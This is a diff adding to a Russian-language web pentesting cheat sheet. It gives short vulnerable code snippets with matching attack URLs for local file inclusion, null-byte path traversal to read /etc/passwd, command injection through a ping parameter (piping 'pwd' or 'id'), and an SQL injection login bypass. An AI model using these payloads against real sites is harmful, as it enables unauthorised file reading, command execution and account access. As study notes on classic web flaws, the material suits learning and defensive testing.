@@ -38,9 +38,58 @@ svn checkout http://svn.target.org/egro/trunk/alias/default
 ls egro
 ls egro/.svn/ - тут может быть полезная информация.
 
+***********************************************************
 LFI
+
+Если можно внедрить в код
+рекурентный вызов
 ...
 $name=GET('fn');
 print(loadfile($name));
 ...
+Запустить 
+google.com/runpage.php?page=../runpage.php
+
+************************************************************
+null-byte
+
+...
+$name=GET('fn')+'.txt'
+loadfile($name);
+...
+
+google.com/getpage.php?page=../../../../../../etc/passwd%00
+
+***********************************************************
+
+comand injection
+...
+$param = GET('host')
+system('ping -c 1' +$param);
+...
+
+google.com/hosttool.php?host=8.8.8.8:id
+or
+google.com/hosttool.php?host=8.8.8.8|pwd
+
+***************************************************************
+
+SQL Injection
+
+http://target.com/login?name=alex' -- .&pass=any
+
+запрос будет следующий
+SELECT id FROM users WHERE user='alex' -- .' and password ='1234'
+
+после .' and password ='1234'запрос будет обросан и мы должны получить id успешную авторизацию, но как правило
+такие пользователи ыз маленькой привилегией.
+
+ 
+
+
+
+
+
+
+
 
